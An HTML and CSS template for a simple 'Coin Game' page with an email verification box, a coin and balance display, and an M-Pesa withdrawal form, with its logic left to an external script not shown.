<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Coin Game</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: white;
            color: green;
            text-align: center;
            margin: 0;
            padding: 20px;
        }

        #coin {
            width: 100px;
            height: 100px;
            margin: 50px auto;
            background: url('path-to-coin-image.png') no-repeat center center;
            background-size: cover;
            cursor: pointer;
        }

        #balance {
            display: flex;
            align-items: center;
            justify-content: center;
            margin-top: 20px;
        }

        #wallet {
            margin-left: 10px;
            width: 50px;
            height: 50px;
            background: url('path-to-wallet-icon.png') no-repeat center center;
            background-size: cover;
            cursor: pointer;
        }

        .hidden {
            display: none;
        }
    </style>
</head>
<body>
    <h2>Coin Game</h2>
    <div id="verification" class="hidden">
        <p>Enter the verification code sent to your email:</p>
        <input type="text" id="verificationCode" placeholder="Verification Code">
        <button onclick="verifyCode()">Verify</button>
    </div>

    <div id="game" class="hidden">
        <div id="coin"></div>
        <p id="result"></p>
        <div id="balance">
            <p>Balance: <span id="balanceAmount">0</span></p>
            <div id="wallet" onclick="showWithdrawal()"></div>
        </div>
    </div>

    <div id="withdrawal" class="hidden">
        <p>Enter the amount to withdraw:</p>
        <input type="number" id="withdrawAmount" placeholder="Amount">
        <p>Paste your M-Pesa message:</p>
        <textarea id="mpesaMessage" placeholder="Paste M-Pesa message here"></textarea>
        <button onclick="processWithdrawal()">Withdraw</button>
        <p id="withdrawResult"></p>
    </div>

    <script src="script.js"></script>
</body>
</html>
